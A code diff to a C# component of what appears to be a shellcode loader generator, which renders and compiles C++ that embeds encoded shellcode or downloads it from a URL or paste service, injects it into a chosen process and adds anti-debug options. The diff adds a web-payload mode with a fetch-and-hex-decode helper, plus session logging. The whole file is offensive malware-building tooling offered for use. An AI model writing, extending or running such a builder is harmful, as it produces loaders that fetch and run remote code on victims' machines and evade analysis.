@@ -175,13 +175,20 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
         var notes = new List<string>();
         CompilerToolDiscoveryResult? discovery = null;
+        string? sessionDir = null;
 
         try
         {
+            sessionDir = _paths.CreateCompilationSessionDirectory();
+            notes.Add($"Session log directory: {sessionDir}");
+            _logger.Debug($"Session log: {sessionDir}");
+
+            SaveSessionSettings(sessionDir, data);
+
             discovery = await TryDiscoverCompilerAsync(notes, cancellationToken).ConfigureAwait(false);
 
             var template = ResolveTemplate(data);
-            notes.Add($"Template selected: {template.Display} ({template.Id}).");
+            notes.Add($"Template: {template.Display} ({template.Id}).");
 
             // Build the plan, render the template, then compile if a toolchain is available.
             var plan = new CppCompilationPlan();
@@ -193,17 +200,21 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
             var sourceCode = RenderTemplate(plan, template);
             var sourcePath = await PersistSourceAsync(sourceCode, cancellationToken).ConfigureAwait(false);
 
-            notes.Add($"Generated C++ source at {sourcePath}.");
-            _logger.Ok($"Generated C++ source at {sourcePath}.");
+            // Copy the .cpp to the session log before compilation.
+            CopyToSessionDir(sessionDir, sourcePath, "source.cpp");
 
-            const string compileMessage = "Attempting native compilation.";
-            notes.Add(compileMessage);
-            _logger.Info(compileMessage);
+            notes.Add($"Generated C++ source at {sourcePath}.");
+            _logger.Debug($"Source saved: {sourcePath}");
+
+            notes.Add("Compiling...");
+            _logger.Info("Compiling...");
 
             var compilerDirectory = ResolveCompilerDirectory(discovery);
             var conversionResult = await ExecuteConversionAsync(sourcePath, compilerDirectory, notes, cancellationToken).ConfigureAwait(false);
 
             DeleteTemporarySource(sourcePath, notes);
+
+            SaveSessionLog(sessionDir, notes, conversionResult);
 
             return new CompilerResult(conversionResult.Success, null, sourceCode, notes, discovery, conversionResult);
         }
@@ -211,6 +222,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         {
             _logger.Warn("Generation cancelled by user.");
             notes.Add("Generation cancelled.");
+            SaveSessionLog(sessionDir, notes, null);
             var cancellation = new CppFileConversionResult(false, "Operation cancelled.");
             return new CompilerResult(false, null, null, notes, discovery, cancellation);
         }
@@ -218,6 +230,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         {
             _logger.Error($"Generation failed: {ex.Message}");
             notes.Add(ex.Message);
+            SaveSessionLog(sessionDir, notes, null);
             var failure = new CppFileConversionResult(false, ex.Message);
             return new CompilerResult(false, null, null, notes, discovery, failure);
         }
@@ -333,6 +346,19 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
                 ConfigureGenericShellcode(plan, source.Value, notes);
                 break;
 
+            case ShellcodeSourceKind.WebPayload:
+                plan.UsesWebPayload = true;
+                plan.WebPayloadCodeBlock = source.Value;
+                // Read the structured preamble if the coordinator provided it separately.
+                if (data.TextBoxes.TryGetValue("__webPayloadPreamble__", out var preambleBlock) &&
+                    !string.IsNullOrWhiteSpace(preambleBlock))
+                {
+                    plan.WebPayloadPreamble = preambleBlock;
+                }
+                notes.Add("Web payload code block injected from wizard.");
+                _logger.Debug("Web payload code block applied.");
+                break;
+
             default:
                 throw new InvalidOperationException($"Unsupported shellcode source '{source.Kind}'.");
         }
@@ -349,7 +375,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
             throw new FileNotFoundException("Shellcode file not found.", filePath);
 
         var args = BuildBin2ShellArguments(data, filePath);
-        _logger.Info($"Bin2Shell args: {string.Join(" ", args.Select(QuoteArg))}");
+        _logger.Debug($"Bin2Shell args: {string.Join(" ", args.Select(QuoteArg))}");
 
         string encoded = await _bin2ShellRunner
             .RunAsync(args, cancellationToken: cancellationToken)
@@ -362,12 +388,14 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         encoded = PatchBin2ShellPayloadLambda(encoded, out patched);
         if (patched)
         {
-            _logger.Info("Applied Bin2Shell lambda capture workaround for local-scope templates.");
+            _logger.Debug("Applied Bin2Shell lambda capture workaround.");
         }
+
+        encoded = RepairCStringLiteralQuotes(encoded);
 
         plan.EncodedShellcodeSnippet = encoded.Trim();
         notes.Add("Encoded shellcode prepared.");
-        _logger.Ok("Encoded shellcode prepared.");
+        _logger.Debug("Encoded shellcode prepared.");
     }
 
     private void ConfigureGenericShellcode(
@@ -401,7 +429,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         var escaped = EscapeForCxxString(url.Trim());
         plan.UrlShellcodeSnippet = $"PCHAR code_blob = UrlDownloadHexTextA((PCHAR)\"{escaped}\", &dwSize);";
         notes.Add("Shellcode URL embedded into plan.");
-        _logger.Ok("Shellcode URL embedded.");
+        _logger.Debug("Shellcode URL embedded.");
     }
 
     private static string PatchBin2ShellPayloadLambda(string output, out bool patched)
@@ -423,6 +451,183 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         patched = changed;
         return updated;
     }
+
+    /// <summary>
+    /// Repairs unescaped double-quote characters inside C string literal continuations.
+    /// Bin2shell's base91 alphabet includes <c>"</c>. When the encoder wraps long payloads
+    /// into multi-line C string literals, <c>"</c> characters at line-split boundaries can
+    /// produce <c>""X..."</c> (empty string + invalid suffix) instead of <c>"\"X..."</c>.
+    /// This pass re-escapes any unescaped <c>"</c> inside string content lines.
+    /// </summary>
+    private static string RepairCStringLiteralQuotes(string code)
+    {
+        if (string.IsNullOrWhiteSpace(code))
+            return code ?? string.Empty;
+
+        var lines = code.Split('\n');
+        var sb = new StringBuilder(code.Length + 128);
+        bool inMultiLineString = false;
+
+        for (int i = 0; i < lines.Length; i++)
+        {
+            var line = lines[i];
+            var trimmed = line.TrimStart();
+
+            // Detect start of multi-line string: `const char xxx[] =`
+            // or `"..." (continuation line)`
+            if (trimmed.StartsWith("\"", StringComparison.Ordinal) && inMultiLineString)
+            {
+                // This is a continuation line: "...content..."
+                // Extract the content between the outer quotes and re-escape inner quotes
+                var repaired = RepairStringLine(trimmed);
+                sb.Append(line.AsSpan(0, line.Length - trimmed.Length)); // preserve indent
+                sb.Append(repaired);
+            }
+            else
+            {
+                sb.Append(line);
+            }
+
+            // Track if we're inside a multi-line string declaration
+            if (trimmed.Contains("code_blob_text[]", StringComparison.Ordinal) ||
+                trimmed.Contains("code_blob_text =", StringComparison.Ordinal))
+            {
+                inMultiLineString = true;
+            }
+
+            // End of multi-line string: line ending with `";` (with trailing whitespace)
+            if (inMultiLineString && trimmed.TrimEnd().EndsWith(";", StringComparison.Ordinal))
+            {
+                inMultiLineString = false;
+            }
+
+            if (i < lines.Length - 1)
+                sb.Append('\n');
+        }
+
+        return sb.ToString();
+    }
+
+    /// <summary>
+    /// Given a line like <c>"abc\"def"ghi..."</c>, ensures all <c>"</c> inside the
+    /// string content are properly escaped as <c>\"</c>.
+    /// </summary>
+    private static string RepairStringLine(string trimmedLine)
+    {
+        // Expected form: "...content..." possibly followed by trailing whitespace
+        // Find the opening quote
+        if (trimmedLine.Length < 2 || trimmedLine[0] != '"')
+            return trimmedLine;
+
+        // Find the real closing quote: last `"` that isn't preceded by `\`
+        int closeIdx = -1;
+        for (int i = trimmedLine.Length - 1; i > 0; i--)
+        {
+            if (trimmedLine[i] == '"')
+            {
+                // Check it's not escaped
+                int backslashes = 0;
+                for (int j = i - 1; j >= 0 && trimmedLine[j] == '\\'; j--)
+                    backslashes++;
+                if (backslashes % 2 == 0)
+                {
+                    closeIdx = i;
+                    break;
+                }
+            }
+        }
+
+        if (closeIdx <= 0)
+            return trimmedLine; // Can't parse, leave as-is
+
+        // Extract content between quotes
+        var content = trimmedLine.AsSpan(1, closeIdx - 1);
+        var suffix = trimmedLine.AsSpan(closeIdx + 1);
+
+        // Re-escape: first unescape all `\"` to `"`, then escape all `"` to `\"`
+        var unescaped = content.ToString().Replace("\\\"", "\"");
+        var reescaped = unescaped.Replace("\"", "\\\"");
+
+        return $"\"{reescaped}\"{suffix}";
+    }
+
+    /// <summary>
+    /// Replaces all captureless C++ lambdas <c>= []() {</c> with <c>= [&amp;]() {</c>
+    /// so local variables like <c>enc_len</c> and <c>enc_buf</c> are accessible.
+    /// </summary>
+    private static string PatchCapturelessLambdas(string code)
+    {
+        if (string.IsNullOrWhiteSpace(code))
+            return code ?? string.Empty;
+
+        // Match  "= []() {" or "= [] () {" (with optional whitespace variants).
+        return CapturelessLambdaRegex.Replace(code, m => m.Groups[1].Value + "[&]" + m.Groups[2].Value);
+    }
+
+    private static readonly Regex CapturelessLambdaRegex =
+        new(@"(=\s*)\[\s*\](\s*\()", RegexOptions.Compiled);
+
+    /// <summary>
+    /// Wraps every <c>bin2shell_fetch_payload_from_url(...)</c> call with
+    /// <c>bin2shell_maybe_decode_hex(...)</c> so that hex-text payloads hosted on
+    /// paste services are transparently converted to raw binary.
+    /// </summary>
+    private static string WrapFetchWithHexDecode(string body)
+    {
+        if (string.IsNullOrWhiteSpace(body))
+            return body ?? string.Empty;
+
+        return FetchPayloadCallRegex.Replace(body,
+            "bin2shell_maybe_decode_hex(bin2shell_fetch_payload_from_url($1))");
+    }
+
+    private static readonly Regex FetchPayloadCallRegex =
+        new(@"bin2shell_fetch_payload_from_url\(([^)]+)\)", RegexOptions.Compiled);
+
+    /// <summary>
+    /// C++ helper function injected into the web payload preamble.
+    /// Auto-detects hex-text payloads (e.g. "0x48 0x83 0xEC ...") and converts
+    /// them to raw binary bytes.  Raw binary content passes through unchanged.
+    /// </summary>
+    private const string CppHexDecodeHelper = """
+
+        static std::vector<unsigned char> bin2shell_maybe_decode_hex(std::vector<unsigned char> raw) {
+            if (raw.size() < 4) return raw;
+            // Check if content looks like hex text ("0x" prefix after optional whitespace).
+            size_t start = 0;
+            while (start < raw.size() && (raw[start] == ' ' || raw[start] == '\r' ||
+                   raw[start] == '\n' || raw[start] == '\t')) ++start;
+            if (start + 1 >= raw.size() || raw[start] != '0' ||
+                (raw[start+1] != 'x' && raw[start+1] != 'X'))
+                return raw; // Not hex text — return as-is (raw binary).
+
+            auto hexval = [](unsigned char ch) -> int {
+                if (ch >= '0' && ch <= '9') return ch - '0';
+                if (ch >= 'a' && ch <= 'f') return 10 + ch - 'a';
+                if (ch >= 'A' && ch <= 'F') return 10 + ch - 'A';
+                return -1;
+            };
+
+            std::vector<unsigned char> result;
+            result.reserve(raw.size() / 4);
+            for (size_t i = start; i < raw.size(); ) {
+                unsigned char c = raw[i];
+                if (c == ' ' || c == '\r' || c == '\n' || c == '\t') { ++i; continue; }
+                if (c == '0' && i + 3 < raw.size() &&
+                    (raw[i+1] == 'x' || raw[i+1] == 'X')) {
+                    int h = hexval(raw[i+2]);
+                    int l = hexval(raw[i+3]);
+                    if (h >= 0 && l >= 0) {
+                        result.push_back(static_cast<unsigned char>((h << 4) | l));
+                        i += 4;
+                        continue;
+                    }
+                }
+                ++i;
+            }
+            return result;
+        }
+        """;
 
     private async Task<string> PersistSourceAsync(string sourceCode, CancellationToken cancellationToken)
     {
@@ -596,9 +801,8 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
             if (result.Success)
             {
-                const string successMessage = "CppFileConverter completed successfully.";
-                notes.Add(successMessage);
-                _logger.Ok(successMessage);
+                notes.Add("Compilation completed.");
+                _logger.Debug("CppFileConverter completed successfully.");
             }
             else
             {
@@ -637,13 +841,91 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
             File.Delete(sourcePath);
             var message = $"Temporary C++ source deleted: {sourcePath}.";
             notes.Add(message);
-            _logger.Info(message);
+            _logger.Debug(message);
         }
         catch (Exception ex)
         {
             var message = $"Failed to delete temporary C++ source '{sourcePath}': {ex.Message}";
             notes.Add(message);
             _logger.Warn(message);
+        }
+    }
+
+    private void SaveSessionSettings(string? sessionDir, UiData data)
+    {
+        if (string.IsNullOrWhiteSpace(sessionDir))
+            return;
+
+        try
+        {
+            var sb = new StringBuilder();
+            sb.AppendLine($"Timestamp: {DateTime.UtcNow:O}");
+            sb.AppendLine();
+            sb.AppendLine("=== TextBoxes ===");
+            foreach (var entry in data.TextBoxes.OrderBy(k => k.Key))
+            {
+                string val = entry.Value ?? string.Empty;
+                string display = val.Length > 500 ? val[..500] + "...(truncated)" : val;
+                sb.AppendLine($"{entry.Key} = {display}");
+            }
+            sb.AppendLine();
+            sb.AppendLine("=== ComboBoxes ===");
+            foreach (var entry in data.ComboBoxes.OrderBy(k => k.Key))
+                sb.AppendLine($"{entry.Key} = {entry.Value}");
+            sb.AppendLine();
+            sb.AppendLine("=== ListBoxes ===");
+            foreach (var entry in data.ListBoxes.OrderBy(k => k.Key))
+            {
+                sb.AppendLine($"{entry.Key} =");
+                foreach (var item in entry.Value ?? new List<string>())
+                    sb.AppendLine($"  - {item}");
+            }
+
+            File.WriteAllText(Path.Combine(sessionDir, "settings.txt"), sb.ToString());
+        }
+        catch (Exception ex)
+        {
+            _logger.Warn($"Failed to save session settings: {ex.Message}");
+        }
+    }
+
+    private void SaveSessionLog(string? sessionDir, IReadOnlyList<string> notes, CppFileConversionResult? conversionResult)
+    {
+        if (string.IsNullOrWhiteSpace(sessionDir))
+            return;
+
+        try
+        {
+            var sb = new StringBuilder();
+            sb.AppendLine($"Timestamp: {DateTime.UtcNow:O}");
+            sb.AppendLine($"Success: {conversionResult?.Success.ToString() ?? "N/A"}");
+            sb.AppendLine($"Error: {conversionResult?.Error ?? "none"}");
+            sb.AppendLine();
+            sb.AppendLine("=== Notes ===");
+            foreach (var note in notes)
+                sb.AppendLine(note);
+
+            File.WriteAllText(Path.Combine(sessionDir, "build_log.txt"), sb.ToString());
+        }
+        catch (Exception ex)
+        {
+            _logger.Warn($"Failed to save session log: {ex.Message}");
+        }
+    }
+
+    private void CopyToSessionDir(string? sessionDir, string? sourcePath, string targetName)
+    {
+        if (string.IsNullOrWhiteSpace(sessionDir) || string.IsNullOrWhiteSpace(sourcePath))
+            return;
+
+        try
+        {
+            if (File.Exists(sourcePath))
+                File.Copy(sourcePath, Path.Combine(sessionDir, targetName), overwrite: true);
+        }
+        catch (Exception ex)
+        {
+            _logger.Warn($"Failed to copy '{sourcePath}' to session dir: {ex.Message}");
         }
     }
 
@@ -805,7 +1087,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
         var note = $"Process injection target set to {trimmedName}.";
         notes.Add(note);
-        _logger.Ok(note);
+        _logger.Debug(note);
     }
 
     private void ApplyAntiDebugSelection(
@@ -873,7 +1155,17 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         ArgumentNullException.ThrowIfNull(template);
 
         var values = BuildPlaceholderValues(plan);
-        return ApplyTemplateContent(template.Content ?? string.Empty, values);
+        var rendered = ApplyTemplateContent(template.Content ?? string.Empty, values);
+
+        // Inject web payload preamble (#includes + fetch helper function) at file scope
+        // before main(). The body (declarations, payload init, decode) is already in
+        // {{SHELLCODE_SOURCE}} via BuildShellcodeSourceBlock.
+        if (plan.UsesWebPayload && !string.IsNullOrWhiteSpace(plan.WebPayloadPreamble))
+        {
+            rendered = InjectWebPayloadPreamble(rendered, plan.WebPayloadPreamble);
+        }
+
+        return rendered;
     }
 
     private static Dictionary<string, string> BuildPlaceholderValues(CppCompilationPlan plan)
@@ -956,6 +1248,19 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
     private static string BuildShellcodeSourceBlock(CppCompilationPlan plan)
     {
         ArgumentNullException.ThrowIfNull(plan);
+
+        // Web payload mode: the code block already contains only the body
+        // (declarations, payload init, decode) that belongs inside main().
+        // The preamble (#includes, fetch helper) is handled separately via
+        // InjectWebPayloadPreamble.
+        if (plan.UsesWebPayload && !string.IsNullOrWhiteSpace(plan.WebPayloadCodeBlock))
+        {
+            var body = plan.WebPayloadCodeBlock;
+            body = PatchCapturelessLambdas(body);
+            body = WrapFetchWithHexDecode(body);
+            return NormalizeBlock(body);
+        }
+
         // Prefer encoded shellcode, then generic payload, else a safe stub.
         var sb = new StringBuilder();
         if (!string.IsNullOrWhiteSpace(plan.EncodedShellcodeSnippet))
@@ -978,6 +1283,68 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         }
 
         return NormalizeBlock(sb.ToString());
+    }
+
+    /// <summary>
+    /// Injects the web payload preamble (#includes, helper classes/functions) into the
+    /// rendered source at file scope, right before the entry point function.
+    /// The <paramref name="preamble"/> is already the file-scope block — no splitting needed.
+    /// </summary>
+    private static string InjectWebPayloadPreamble(string rendered, string preamble)
+    {
+        if (string.IsNullOrWhiteSpace(preamble))
+            return rendered;
+
+        var normalizedPreamble = NormalizeBlock(preamble);
+
+        // Add linker pragma for MSVC (GCC uses -lwinhttp via DetectRequiredLibraries).
+        if (normalizedPreamble.Contains("#include <winhttp.h>", StringComparison.OrdinalIgnoreCase) &&
+            !normalizedPreamble.Contains("pragma comment", StringComparison.OrdinalIgnoreCase))
+        {
+            normalizedPreamble = "#pragma comment(lib, \"winhttp.lib\")\n" + normalizedPreamble;
+        }
+
+        // Append the hex-text auto-decode helper so bin2shell_maybe_decode_hex is
+        // available when the body wraps the fetch call.
+        normalizedPreamble += "\n" + NormalizeBlock(CppHexDecodeHelper);
+
+        // Find the entry point function. Templates use either "INT main(VOID)" or
+        // "int main()" or similar. Look for the first line that starts with
+        // a function return type followed by "main".
+        var lines = rendered.Split(new[] { "\r\n", "\n" }, StringSplitOptions.None);
+        int mainIndex = -1;
+        for (int i = 0; i < lines.Length; i++)
+        {
+            var trimmed = lines[i].TrimStart();
+            if (Regex.IsMatch(trimmed, @"^(INT|int|VOID|void)\s+main\s*\(", RegexOptions.IgnoreCase))
+            {
+                mainIndex = i;
+                break;
+            }
+        }
+
+        if (mainIndex < 0)
+        {
+            // No entry point found — prepend at the top after existing includes.
+            return normalizedPreamble + "\n\n" + rendered;
+        }
+
+        var sb = new StringBuilder();
+        for (int i = 0; i < mainIndex; i++)
+        {
+            sb.AppendLine(lines[i]);
+        }
+        sb.AppendLine(normalizedPreamble);
+        sb.AppendLine();
+        for (int i = mainIndex; i < lines.Length; i++)
+        {
+            if (i < lines.Length - 1)
+                sb.AppendLine(lines[i]);
+            else
+                sb.Append(lines[i]); // avoid trailing newline
+        }
+
+        return sb.ToString();
     }
 
     private static readonly Regex PlaceholderLineRegex = new(@"^(?<indent>\s*)\{\{(?<name>[A-Z0-9_]+)\}\}\s*$", RegexOptions.Compiled);
@@ -1119,7 +1486,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
     {
         var message = $"Enabled {sectionName}:{itemId}.";
         notes.Add(message);
-        _logger.Ok(message);
+        _logger.Debug(message);
     }
 
     private IReadOnlyList<string> BuildBin2ShellArguments(UiData data, string shellcodeFile)
@@ -1140,7 +1507,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
         if (TryGetEnvelopeIndex(data, out int envelopeIndex))
         {
-            args.Add("-env");
+            args.Add("-v");
             args.Add(envelopeIndex.ToString(CultureInfo.InvariantCulture));
         }
 
@@ -1381,6 +1748,13 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
 
     private ShellcodeSource DetermineShellcodeSource(UiData data)
     {
+        // Check for web payload injected by the coordinator.
+        if (data.TextBoxes.TryGetValue("__webPayloadCodeBlock__", out var webBlock) &&
+            !string.IsNullOrWhiteSpace(webBlock))
+        {
+            return new ShellcodeSource(ShellcodeSourceKind.WebPayload, webBlock);
+        }
+
         data.TextBoxes.TryGetValue("shellcodeFile", out var filePathRaw);
         data.TextBoxes.TryGetValue("shellcodeRAW", out var rawInput);
         data.TextBoxes.TryGetValue("shellcodeURL", out var urlInput);
@@ -1451,7 +1825,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         string path = Path.Combine(dir, fileName);
 
         File.WriteAllBytes(path, bytes);
-        _logger.Ok($"Raw shellcode persisted to {path}.");
+        _logger.Debug($"Raw shellcode persisted to {path}.");
         return path;
     }
 
@@ -1477,6 +1851,7 @@ DWORD GetProcessOrThreadId(const std::wstring& processName, bool returnProcessId
         File,
         Raw,
         Url,
-        Generic
+        Generic,
+        WebPayload
     }
 }
